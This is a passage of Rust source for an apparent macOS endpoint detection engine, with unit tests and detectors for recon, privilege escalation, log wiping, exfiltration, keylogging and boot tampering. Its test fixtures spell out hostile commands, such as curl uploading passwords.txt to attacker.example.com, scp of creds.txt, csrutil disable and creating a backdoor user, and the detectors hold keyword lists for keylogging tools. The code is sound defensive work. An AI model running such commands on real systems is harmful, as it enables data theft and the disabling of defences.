            "/Users/victim/Desktop -name '*.pem'",
            "interpreter",
        ));
        ctx.recent_processes.push(make_process(
            3003,
            900,
            "/usr/bin/find",
            "/Users/victim/Downloads -name '*.p12'",
            "interpreter",
        ));
        let events = detect_filesystem_recon(&ctx);
        assert!(
            events.iter().any(|e| e.event_type == "alert_filesystem_recon_detected"),
            "three find invocations should fire filesystem recon alert"
        );
    }

    #[test]
    fn filesystem_recon_does_not_fire_for_two_invocations() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            3004,
            900,
            "/usr/bin/find",
            "/tmp -name '*.tmp'",
            "user_app",
        ));
        ctx.recent_processes.push(make_process(
            3005,
            900,
            "/usr/bin/find",
            "/var/log -name '*.log'",
            "user_app",
        ));
        let events = detect_filesystem_recon(&ctx);
        assert!(
            events.is_empty(),
            "only two find invocations should not fire"
        );
    }

    #[test]
    fn filesystem_recon_does_not_fire_for_system_find() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        for i in 0..5 {
            ctx.recent_processes.push(make_process(
                3010 + i,
                1,
                "/usr/bin/find",
                "/System",
                "system",
            ));
        }
        let events = detect_filesystem_recon(&ctx);
        assert!(
            events.is_empty(),
            "find invocations by system processes should not fire"
        );
    }

    // ── detect_privilege_escalation ────────────────────────────────────────────

    #[test]
    fn privilege_escalation_fires_for_sudo_from_interpreter_parent() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        let mut proc = make_process(4001, 900, "/usr/bin/sudo", "bash -c 'id'", "unknown");
        proc.parent_process_kind = Some("interpreter".to_string());
        ctx.recent_processes.push(proc);
        let events = detect_privilege_escalation(&ctx);
        assert!(
            events.iter().any(|e| e.event_type == "alert_suspicious_sudo_execution"),
            "sudo from interpreter parent should fire"
        );
    }

    #[test]
    fn privilege_escalation_fires_for_chmod_setuid() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            4002,
            900,
            "/bin/chmod",
            "u+s /Users/victim/Downloads/exploit",
            "user_app",
        ));
        let events = detect_privilege_escalation(&ctx);
        assert!(
            events.iter().any(|e| e.event_type == "alert_privilege_escalation_attempt"),
            "chmod u+s should fire privilege escalation alert"
        );
    }

    #[test]
    fn privilege_escalation_fires_for_chmod_numeric_setgid() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            4003,
            900,
            "/bin/chmod",
            " 2755 /Users/victim/tool",
            "user_app",
        ));
        let events = detect_privilege_escalation(&ctx);
        assert!(
            events.iter().any(|e| e.event_type == "alert_privilege_escalation_attempt"),
            "chmod 2755 (setgid) should fire"
        );
    }

    #[test]
    fn privilege_escalation_fires_for_osascript_admin_shell() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            4004,
            900,
            "/usr/bin/osascript",
            "-e 'do shell script \"id\" with administrator privileges'",
            "interpreter",
        ));
        let events = detect_privilege_escalation(&ctx);
        assert!(
            events.iter().any(|e| e.event_type == "alert_privilege_escalation_attempt"),
            "osascript do shell script with administrator should fire"
        );
    }

    #[test]
    fn privilege_escalation_does_not_fire_for_normal_sudo() {
        // sudo called by a non-interpreter, non-Downloads parent should not fire
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            4005,
            1,
            "/usr/bin/sudo",
            "launchctl start com.example.service",
            "system",
        ));
        let events = detect_privilege_escalation(&ctx);
        assert!(
            !events.iter().any(|e| e.event_type == "alert_suspicious_sudo_execution"),
            "sudo from system parent should not fire suspicious sudo"
        );
    }

    #[test]
    fn privilege_escalation_does_not_fire_for_chmod_normal_perms() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            4006,
            900,
            "/bin/chmod",
            "755 /Users/victim/app/binary",
            "user_app",
        ));
        let events = detect_privilege_escalation(&ctx);
        assert!(
            events.is_empty(),
            "chmod 755 (no setuid/setgid) should not fire"
        );
    }

    // ── detect_indicator_removal ───────────────────────────────────────────────

    #[test]
    fn indicator_removal_fires_for_history_clear() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            5001,
            900,
            "/bin/bash",
            "-c 'history -c'",
            "interpreter",
        ));
        let events = detect_indicator_removal(&ctx);
        assert!(
            events.iter().any(|e| e.event_type == "alert_indicator_removal_attempt"),
            "bash running history -c should fire indicator removal"
        );
    }

    #[test]
    fn indicator_removal_fires_for_histfile_devnull() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            5002,
            900,
            "/bin/zsh",
            "-c 'export HISTFILE=/dev/null'",
            "interpreter",
        ));
        let events = detect_indicator_removal(&ctx);
        assert!(
            events.iter().any(|e| e.event_type == "alert_indicator_removal_attempt"),
            "zsh with HISTFILE=/dev/null should fire"
        );
    }

    #[test]
    fn indicator_removal_fires_for_rm_targeting_varlog() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            5003,
            900,
            "/bin/rm",
            "-rf /var/log/system.log",
            "user_app",
        ));
        let events = detect_indicator_removal(&ctx);
        assert!(
            events.iter().any(|e| e.event_type == "alert_indicator_removal_attempt"),
            "rm targeting /var/log should fire"
        );
    }

    #[test]
    fn indicator_removal_fires_for_xattr_removing_quarantine() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            5004,
            900,
            "/usr/bin/xattr",
            "-d com.apple.quarantine /Users/victim/Downloads/payload.sh",
            "user_app",
        ));
        let events = detect_indicator_removal(&ctx);
        assert!(
            events.iter().any(|e| e.event_type == "alert_indicator_removal_attempt"),
            "xattr -d com.apple.quarantine should fire"
        );
    }

    #[test]
    fn indicator_removal_does_not_fire_for_rm_normal_file() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            5005,
            900,
            "/bin/rm",
            "/Users/victim/Downloads/old_report.pdf",
            "user_app",
        ));
        let events = detect_indicator_removal(&ctx);
        assert!(
            events.is_empty(),
            "rm targeting a normal file should not fire"
        );
    }

    #[test]
    fn indicator_removal_does_not_fire_for_xattr_listing() {
        // xattr without -d flag (just listing) should not fire
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            5006,
            900,
            "/usr/bin/xattr",
            "-l /Users/victim/Downloads/file.dmg",
            "user_app",
        ));
        let events = detect_indicator_removal(&ctx);
        assert!(
            events.is_empty(),
            "xattr -l (listing) should not fire indicator removal"
        );
    }

    // ── detect_screen_capture ─────────────────────────────────────────────────

    #[test]
    fn screen_capture_fires_for_screencapture_by_user_app() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            6001,
            900,
            "/usr/sbin/screencapture",
            "-x /tmp/screen.png",
            "user_app",
        ));
        let events = detect_screen_capture(&ctx);
        assert!(
            events.iter().any(|e| e.event_type == "alert_screen_capture_attempt"),
            "screencapture by user_app should fire"
        );
    }

    #[test]
    fn screen_capture_fires_for_imagesnap_by_interpreter() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            6002,
            900,
            "/usr/local/bin/imagesnap",
            "-w 1 /tmp/cam.jpg",
            "interpreter",
        ));
        let events = detect_screen_capture(&ctx);
        assert!(
            events.iter().any(|e| e.event_type == "alert_suspicious_media_access"),
            "imagesnap by interpreter should fire suspicious media access"
        );
    }

    #[test]
    fn screen_capture_does_not_fire_for_system_process() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            600,
            1,
            "/usr/sbin/screencapture",
            "-x /tmp/screen.png",
            "system",
        ));
        let events = detect_screen_capture(&ctx);
        assert!(
            events.is_empty(),
            "screencapture by system process should not fire"
        );
    }

    #[test]
    fn screen_capture_does_not_fire_for_known_meeting_app() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        let mut proc = make_process(
            6003,
            900,
            "/usr/sbin/screencapture",
            "-x /tmp/meeting.png",
            "user_app",
        );
        proc.parent_command = Some("/Applications/zoom.us.app/Contents/MacOS/zoom.us".to_string());
        ctx.recent_processes.push(proc);
        let events = detect_screen_capture(&ctx);
        assert!(
            events.is_empty(),
            "screencapture from Zoom parent should not fire"
        );
    }

    // ── detect_data_staging ───────────────────────────────────────────────────

    #[test]
    fn data_staging_fires_for_tar_to_tmp_by_interpreter() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            7001,
            900,
            "/usr/bin/tar",
            "-czf /tmp/loot.tar.gz /Users/victim/Documents",
            "interpreter",
        ));
        let events = detect_data_staging(&ctx);
        assert!(
            events.iter().any(|e| e.event_type == "alert_suspicious_archive_creation"),
            "tar to /tmp by interpreter should fire"
        );
    }

    #[test]
    fn data_staging_fires_for_zip_to_trash() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            7002,
            900,
            "/usr/bin/zip",
            "-r /Users/victim/.Trash/data.zip /Users/victim/Documents",
            "user_app",
        ));
        let events = detect_data_staging(&ctx);
        assert!(
            events.iter().any(|e| e.event_type == "alert_suspicious_archive_creation"),
            "zip to .Trash should fire suspicious archive creation"
        );
    }

    #[test]
    fn data_staging_fires_for_bulk_files_in_tmp() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        for i in 0..12 {
            ctx.recent_file_events.push(make_file_event(
                "file_created",
                &format!("/tmp/staged_file_{}.dat", i),
                false,
                false,
                0,
            ));
        }
        let events = detect_data_staging(&ctx);
        assert!(
            events.iter().any(|e| e.event_type == "alert_data_staging_detected"),
            "12 files created in /tmp should fire data staging alert"
        );
    }

    #[test]
    fn data_staging_does_not_fire_for_normal_tar() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            7003,
            1,
            "/usr/bin/tar",
            "-czf /Users/victim/backup.tar.gz /Users/victim/project",
            "system",
        ));
        let events = detect_data_staging(&ctx);
        assert!(
            events.iter().all(|e| e.event_type != "alert_suspicious_archive_creation"),
            "tar by system process to home dir should not fire"
        );
    }

    // ── detect_ssh_lateral_movement ───────────────────────────────────────────

    #[test]
    fn ssh_lateral_fires_for_stricthostkeychecking_no() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            8001,
            900,
            "/usr/bin/ssh",
            "-o StrictHostKeyChecking=no attacker@remote.evil.com",
            "user_app",
        ));
        let events = detect_ssh_lateral_movement(&ctx);
        assert!(
            events.iter().any(|e| e.event_type == "alert_ssh_lateral_movement"),
            "ssh with StrictHostKeyChecking=no should fire"
        );
    }

    #[test]
    fn ssh_lateral_fires_for_scp_from_interpreter() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        let mut proc = make_process(
            8002,
            900,
            "/usr/bin/scp",
            "/Users/victim/Documents/creds.txt attacker@remote.evil.com:/tmp/",
            "unknown",
        );
        proc.parent_process_kind = Some("interpreter".to_string());
        ctx.recent_processes.push(proc);
        let events = detect_ssh_lateral_movement(&ctx);
        assert!(
            events.iter().any(|e| e.event_type == "alert_ssh_lateral_movement"),
            "scp with interpreter parent should fire lateral movement"
        );
    }

    #[test]
    fn ssh_key_tampering_fires_for_authorized_keys_write() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_file_events.push(make_file_event(
            "file_modified",
            "/Users/victim/.ssh/authorized_keys",
            false,
            false,
            0,
        ));
        let events = detect_ssh_lateral_movement(&ctx);
        assert!(
            events.iter().any(|e| e.event_type == "alert_ssh_key_tampering"),
            "write to authorized_keys should fire ssh key tampering"
        );
    }

    #[test]
    fn ssh_lateral_does_not_fire_for_normal_ssh() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            8003,
            900,
            "/usr/bin/ssh",
            "user@myserver.example.com",
            "user_app",
        ));
        let events = detect_ssh_lateral_movement(&ctx);
        assert!(
            events.iter().all(|e| e.event_type != "alert_ssh_lateral_movement"),
            "normal ssh without suspicious flags should not fire"
        );
    }

    #[test]
    fn ssh_lateral_does_not_fire_for_git_reading_known_hosts() {
        // git reads ~/.ssh/known_hosts legitimately
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            8004,
            900,
            "/usr/bin/git",
            "clone git@github.com:user/repo.git ~/.ssh/known_hosts",
            "user_app",
        ));
        let events = detect_ssh_lateral_movement(&ctx);
        assert!(
            events.iter().all(|e| e.event_type != "alert_ssh_key_tampering"),
            "git reading known_hosts should not fire"
        );
    }

    // ── detect_browser_extension_installed ────────────────────────────────────

    #[test]
    fn browser_extension_fires_for_new_chrome_extension() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_file_events.push(make_file_event(
            "file_created",
            "/Users/victim/Library/Application Support/Google/Chrome/Default/Extensions/abcdefghijklmnop/3.0.1_0/manifest.json",
            false,
            false,
            0,
        ));
        let events = detect_browser_extension_installed(&ctx);
        assert!(
            events.iter().any(|e| e.event_type == "alert_browser_extension_installed"),
            "new file in Chrome Extensions dir should fire"
        );
    }

    #[test]
    fn browser_extension_fires_for_new_firefox_extension() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_file_events.push(make_file_event(
            "file_created",
            "/Users/victim/Library/Application Support/Firefox/Profiles/abcd1234.default-release/extensions/evil@example.com.xpi",
            false,
            false,
            0,
        ));
        let events = detect_browser_extension_installed(&ctx);
        assert!(
            events.iter().any(|e| e.event_type == "alert_browser_extension_installed"),
            "new .xpi in Firefox profiles/extensions should fire"
        );
    }

    #[test]
    fn browser_extension_does_not_fire_for_unrelated_file() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_file_events.push(make_file_event(
            "file_created",
            "/Users/victim/Downloads/malware.sh",
            false,
            false,
            0,
        ));
        let events = detect_browser_extension_installed(&ctx);
        assert!(
            events.is_empty(),
            "file outside extension dirs should not fire"
        );
    }

    // ── detect_exfiltration_pattern ───────────────────────────────────────────

    #[test]
    fn exfiltration_fires_for_curl_with_data_flag() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            9001,
            900,
            "/usr/bin/curl",
            "--data-binary @/tmp/collected.txt https://attacker.example.com/upload",
            "user_app",
        ));
        let events = detect_exfiltration_pattern(&ctx);
        assert!(
            events.iter().any(|e| e.event_type == "alert_upload_command_detected" || e.event_type == "alert_suspected_exfiltration"),
            "curl --data-binary should fire upload detection"
        );
    }

    #[test]
    fn exfiltration_fires_critical_when_referencing_documents() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            9002,
            900,
            "/usr/bin/curl",
            "--data @/Users/victim/Documents/passwords.txt https://attacker.example.com/collect",
            "interpreter",
        ));
        let events = detect_exfiltration_pattern(&ctx);
        assert!(
            events.iter().any(|e| e.event_type == "alert_suspected_exfiltration"),
            "curl --data referencing /Documents/ should fire suspected exfiltration"
        );
    }

    #[test]
    fn exfiltration_fires_for_curl_with_short_d_flag() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            9003,
            900,
            "/usr/bin/curl",
            "-d '{\"key\":\"stolen_value\"}' https://attacker.example.com/hook",
            "user_app",
        ));
        let events = detect_exfiltration_pattern(&ctx);
        assert!(
            events.iter().any(|e| e.event_type == "alert_upload_command_detected" || e.event_type == "alert_suspected_exfiltration"),
            "curl -d should fire upload detection"
        );
    }

    #[test]
    fn exfiltration_does_not_fire_for_normal_curl_download() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            9004,
            900,
            "/usr/bin/curl",
            "-o /tmp/file.zip https://releases.example.com/v1.0.zip",
            "user_app",
        ));
        let events = detect_exfiltration_pattern(&ctx);
        assert!(
            events.is_empty(),
            "curl downloading a file should not fire exfiltration"
        );
    }

    #[test]
    fn exfiltration_does_not_fire_for_wget_download() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            9005,
            900,
            "/usr/bin/wget",
            "https://example.com/package.tar.gz",
            "user_app",
        ));
        let events = detect_exfiltration_pattern(&ctx);
        assert!(
            events.is_empty(),
            "wget downloading a file should not fire exfiltration"
        );
    }

    // ── detect_keylogging_attempt ──────────────────────────────────────────────

    #[test]
    fn keylogging_fires_for_pynput_in_python_args() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            7001,
            700,
            "/usr/local/bin/python3",
            "-c \"import pynput; listener = pynput.keyboard.Listener(on_press=on_press)\"",
            "interpreter",
        ));
        let events = detect_keylogging_attempt(&ctx);
        assert!(
            events.iter().any(|e| e.event_type == "alert_keylogging_attempt"),
            "should fire for pynput import in python args"
        );
    }

    #[test]
    fn keylogging_fires_for_osascript_keystroke() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            7002,
            700,
            "/usr/bin/osascript",
            "-e \"tell application \\\"System Events\\\" to key down return\"",
            "interpreter",
        ));
        let events = detect_keylogging_attempt(&ctx);
        assert!(
            events.iter().any(|e| e.event_type == "alert_keylogging_attempt"),
            "should fire for osascript key down"
        );
    }

    #[test]
    fn keylogging_does_not_fire_for_normal_python() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            7003,
            700,
            "/usr/local/bin/python3",
            "manage.py runserver",
            "interpreter",
        ));
        let events = detect_keylogging_attempt(&ctx);
        assert!(
            events.iter().all(|e| e.event_type != "alert_keylogging_attempt"),
            "should not fire for normal python invocation"
        );
    }

    // ── detect_boot_security_tamper ────────────────────────────────────────────

    #[test]
    fn boot_tamper_fires_for_csrutil_disable() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            7010,
            700,
            "/usr/bin/csrutil",
            "disable",
            "system",
        ));
        let events = detect_boot_security_tamper(&ctx);
        assert!(
            events.iter().any(|e| e.event_type == "alert_boot_security_tamper"),
            "should fire for csrutil disable"
        );
    }

    #[test]
    fn boot_tamper_fires_for_nvram_csr_active_config() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            7011,
            700,
            "/usr/sbin/nvram",
            "csr-active-config=0x67",
            "system",
        ));
        let events = detect_boot_security_tamper(&ctx);
        assert!(
            events.iter().any(|e| e.event_type == "alert_boot_security_tamper"),
            "should fire for nvram csr-active-config write"
        );
    }

    #[test]
    fn boot_tamper_does_not_fire_for_csrutil_status() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            7012,
            700,
            "/usr/bin/csrutil",
            "status",
            "system",
        ));
        let events = detect_boot_security_tamper(&ctx);
        assert!(
            events.iter().all(|e| e.event_type != "alert_boot_security_tamper"),
            "csrutil status should not trigger boot tamper alert"
        );
    }

    // ── detect_signed_binary_proxy_execution ──────────────────────────────────

    #[test]
    fn signed_proxy_fires_for_installer_from_downloads() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        let mut p = make_process(
            7020,
            700,
            "/usr/sbin/installer",
            "-pkg /Users/user/Downloads/evil.pkg -target /",
            "system",
        );
        p.behavior.references_downloads_path = true;
        ctx.recent_processes.push(p);
        let events = detect_signed_binary_proxy_execution(&ctx);
        assert!(
            events.iter().any(|e| e.event_type == "alert_signed_binary_proxy_execution"),
            "should fire for installer executing pkg from Downloads"
        );
    }

    #[test]
    fn signed_proxy_does_not_fire_for_installer_from_system_path() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            7021,
            700,
            "/usr/sbin/installer",
            "-pkg /Library/Packages/legit.pkg -target /",
            "system",
        ));
        let events = detect_signed_binary_proxy_execution(&ctx);
        assert!(
            events.iter().all(|e| e.event_type != "alert_signed_binary_proxy_execution"),
            "installer from a system path should not trigger alert"
        );
    }

    // ── detect_security_tool_tampering ────────────────────────────────────────

    #[test]
    fn security_tool_tamper_fires_for_spctl_disable() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            7030,
            700,
            "/usr/sbin/spctl",
            "--master-disable",
            "system",
        ));
        let events = detect_security_tool_tampering(&ctx);
        assert!(
            events.iter().any(|e| e.event_type == "alert_security_tool_tampering"),
            "should fire for spctl --master-disable"
        );
    }

    #[test]
    fn security_tool_tamper_fires_for_pkill_security_process() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            7031,
            700,
            "/usr/bin/pkill",
            "-9 syspolicyd",
            "user_app",
        ));
        let events = detect_security_tool_tampering(&ctx);
        assert!(
            events.iter().any(|e| e.event_type == "alert_security_tool_tampering"),
            "should fire for pkill targeting syspolicyd"
        );
    }

    #[test]
    fn security_tool_tamper_does_not_fire_for_normal_spctl_assess() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            7032,
            700,
            "/usr/sbin/spctl",
            "--assess /Applications/SomeApp.app",
            "system",
        ));
        let events = detect_security_tool_tampering(&ctx);
        assert!(
            events.iter().all(|e| e.event_type != "alert_security_tool_tampering"),
            "spctl --assess should not trigger security tool tamper alert"
        );
    }

    // ── detect_account_manipulation ───────────────────────────────────────────

    #[test]
    fn account_manip_fires_for_dscl_create_user() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        let mut p = make_process(
            7040,
            700,
            "/usr/bin/dscl",
            ". -create /Users/backdoor UniqueID 503",
            "system",
        );
        p.parent_process_kind = Some("interpreter".to_string());
        ctx.recent_processes.push(p);
        let events = detect_account_manipulation(&ctx);
        assert!(
            events.iter().any(|e| e.event_type == "alert_account_manipulation"),
            "should fire for dscl creating a user"
        );
    }

    #[test]
    fn account_manip_does_not_fire_for_dscl_read() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            7041,
            700,
            "/usr/bin/dscl",
            ". -read /Users/alice",
            "system",
        ));
        let events = detect_account_manipulation(&ctx);
        assert!(
            events.iter().all(|e| e.event_type != "alert_account_manipulation"),
            "dscl -read should not trigger account manipulation alert"
        );
    }

    // ── detect_plist_modification ──────────────────────────────────────────────

    #[test]
    fn plist_mod_fires_for_plistbuddy_launchagent() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        let mut p = make_process(
            7050,
            700,
            "/usr/libexec/PlistBuddy",
            "-c :Set ProgramArguments:0 /tmp/evil /Library/LaunchAgents/com.evil.plist",
            "system",
        );
        p.parent_process_kind = Some("interpreter".to_string());
        ctx.recent_processes.push(p);
        let events = detect_plist_modification(&ctx);
        assert!(
            events.iter().any(|e| e.event_type == "alert_plist_modification"),
            "should fire for PlistBuddy modifying a LaunchAgent plist"
        );
    }

    #[test]
    fn plist_mod_fires_for_defaults_write_loginwindow() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        let mut p = make_process(
            7051,
            700,
            "/usr/bin/defaults",
            "write com.apple.loginwindow LoginHook /tmp/hook.sh",
            "system",
        );
        p.parent_process_kind = Some("interpreter".to_string());
        ctx.recent_processes.push(p);
        let events = detect_plist_modification(&ctx);
        assert!(
            events.iter().any(|e| e.event_type == "alert_plist_modification"),
            "should fire for defaults write com.apple.loginwindow"
        );
    }

    #[test]
    fn plist_mod_does_not_fire_for_defaults_write_other_domain() {
        let now = Utc::now();
        let mut ctx = empty_ctx(now);
        ctx.recent_processes.push(make_process(
            7052,
            700,
            "/usr/bin/defaults",
            "write com.apple.finder ShowStatusBar true",
            "system",
        ));
        let events = detect_plist_modification(&ctx);
        assert!(
            events.iter().all(|e| e.event_type != "alert_plist_modification"),
            "defaults write to a non-persistence domain should not trigger"
        );
    }
}

// ─── Keylogging detection (T1056.001) ─────────────────────────────────────────

fn detect_keylogging_attempt(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
    let mut alerts = Vec::new();

    for process in &ctx.recent_processes {
        if process.process_kind == "system" || process.process_kind == "browser" {
            continue;
        }

        let cmd_basename = Path::new(&process.command)
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or("")
            .to_ascii_lowercase();
        let args_lower = process.args.to_ascii_lowercase();

        // Known keylogging library names that appear in interpreter args or as module imports.
        let keylog_lib_indicators = [
            "pynput", "keyboard", "keylogger", "keystroke",
            "cgeventtap", "iohidevent", "iohidmanager",
        ];
        let has_keylog_lib = keylog_lib_indicators.iter().any(|k| args_lower.contains(k));

        // Processes directly accessing the TCC privacy database (accessibility bypass).
        let accesses_tcc = args_lower.contains("tcc.db")
            || args_lower.contains("com.apple.tcc");

        // osascript used to monitor keystrokes via System Events.
        let is_osascript_keystroke = cmd_basename == "osascript"
            && (args_lower.contains("keystroke") || args_lower.contains("key down"));

        if !has_keylog_lib && !accesses_tcc && !is_osascript_keystroke {
            continue;
        }

        let reason = if is_osascript_keystroke {
            format!("osascript invoked with keystroke monitoring argument")
        } else if accesses_tcc {
            format!(
                "Process '{}' accessed TCC privacy database directly — possible accessibility bypass",
                cmd_basename
            )
        } else {
            format!(
                "Process '{}' loaded a keyboard input monitoring library: {}",
                cmd_basename,
                keylog_lib_indicators
                    .iter()
                    .find(|k| args_lower.contains(*k))
                    .unwrap_or(&"unknown")
            )
        };

        let mut details = json!({
            "pid": process.pid,
            "ppid": process.ppid,
            "command": process.command,
            "args": process.args,
            "process_kind": process.process_kind,
            "trigger": if is_osascript_keystroke { "osascript_keystroke" }
                       else if accesses_tcc { "tcc_db_access" }
                       else { "keylog_library" },
            "mitre_technique": "T1056.001",
            "confidence": "medium",
        });
        merge_chain_details(&mut details, chain_details(process.pid, ctx));

        alerts.push(build_alert(
            ctx.now,
            "alert_keylogging_attempt",
            AlertSeverity::High,
            "credential_access",
            &reason,
            details,
        ));
    }

    alerts
}

// ─── Boot & firmware tampering (T1601, T1542) ─────────────────────────────────

fn detect_boot_security_tamper(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
    let mut alerts = Vec::new();

    for process in &ctx.recent_processes {
        let cmd_basename = Path::new(&process.command)
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or("")
            .to_ascii_lowercase();
        let args_lower = process.args.to_ascii_lowercase();

        // csrutil disable — disables System Integrity Protection.
        let is_csrutil_disable = cmd_basename == "csrutil"
            && (args_lower.contains("disable") || args_lower.contains("authenticated-root disable"));

        // nvram writing boot-security or SIP-related variables.
        let nvram_security_write = cmd_basename == "nvram"
            && (args_lower.contains("boot-args")
                || args_lower.contains("csr-active-config")
                || args_lower.contains("nvram-x")
                || args_lower.contains("amfi_get_out_of_my_way"));

        // bless --setBoot or --setboot used to alter boot device.
        let is_bless_setboot = cmd_basename == "bless"
            && (args_lower.contains("--setboot") || args_lower.contains("--setBoot")
                || args_lower.contains("--folder") || args_lower.contains("--bootefi"));

        // systemextensionsctl reset or uninstall — removes kernel-level extensions.
        let is_sext_reset = cmd_basename == "systemextensionsctl"
            && (args_lower.contains("reset") || args_lower.contains("uninstall"));

        let (trigger, mitre, reason) = if is_csrutil_disable {
            ("csrutil_disable", "T1542", "csrutil disable — SIP deactivation attempt")
        } else if nvram_security_write {
            ("nvram_security_write", "T1542", "nvram writing boot security variable")
        } else if is_bless_setboot {
            ("bless_setboot", "T1542", "bless --setboot altering boot device")
        } else if is_sext_reset {
            ("systemextensionsctl_reset", "T1601", "systemextensionsctl reset — kernel extension removal")
        } else {
            continue;
        };

        let mut details = json!({
            "pid": process.pid,
            "ppid": process.ppid,
            "command": process.command,
            "args": process.args,
            "process_kind": process.process_kind,
            "parent_command": process.parent_command,
            "parent_process_kind": process.parent_process_kind,
            "trigger": trigger,
            "mitre_technique": mitre,
            "confidence": "high",
        });
        merge_chain_details(&mut details, chain_details(process.pid, ctx));

        alerts.push(build_alert(
            ctx.now,
            "alert_boot_security_tamper",
            AlertSeverity::Critical,
            "defense_evasion",
            reason,
            details,
        ));
    }

    alerts
}

// ─── Signed binary proxy execution (T1218) ────────────────────────────────────

fn detect_signed_binary_proxy_execution(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
    let mut alerts = Vec::new();

    for process in &ctx.recent_processes {
        let cmd_basename = Path::new(&process.command)
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or("")
            .to_ascii_lowercase();
        let args_lower = process.args.to_ascii_lowercase();

        // installer executing a package from a user-writable or Downloads location.
        let is_installer_downloads = cmd_basename == "installer"
            && (process.behavior.references_downloads_path
                || args_lower.contains("/downloads/")
                || args_lower.contains("/tmp/")
                || args_lower.contains("/var/folders/"));

        // hdiutil attaching a disk image from a suspicious location.
        let is_hdiutil_attach_downloads = cmd_basename == "hdiutil"
            && args_lower.contains("attach")
            && (process.behavior.references_downloads_path
                || args_lower.contains("/downloads/")
                || args_lower.contains("/tmp/"));

        // pkgutil operating on packages from Downloads.
        let is_pkgutil_downloads = cmd_basename == "pkgutil"
            && (args_lower.contains("--expand") || args_lower.contains("--payload-files"))
            && (args_lower.contains("/downloads/") || process.behavior.references_downloads_path);

        // xcodebuild invoked from a non-developer path (script staging).
        let is_xcodebuild_suspicious = cmd_basename == "xcodebuild"
            && (process.process_kind == "interpreter"
                || process.parent_process_kind.as_deref() == Some("interpreter")
                || process.behavior.references_downloads_path);

        let (trigger, reason) = if is_installer_downloads {
            (
                "installer_downloads",
                "Apple installer executing package from user-writable path",
            )
        } else if is_hdiutil_attach_downloads {
            (
                "hdiutil_attach_downloads",
                "hdiutil attaching disk image from user-writable path",
            )
        } else if is_pkgutil_downloads {
            (
                "pkgutil_expand_downloads",
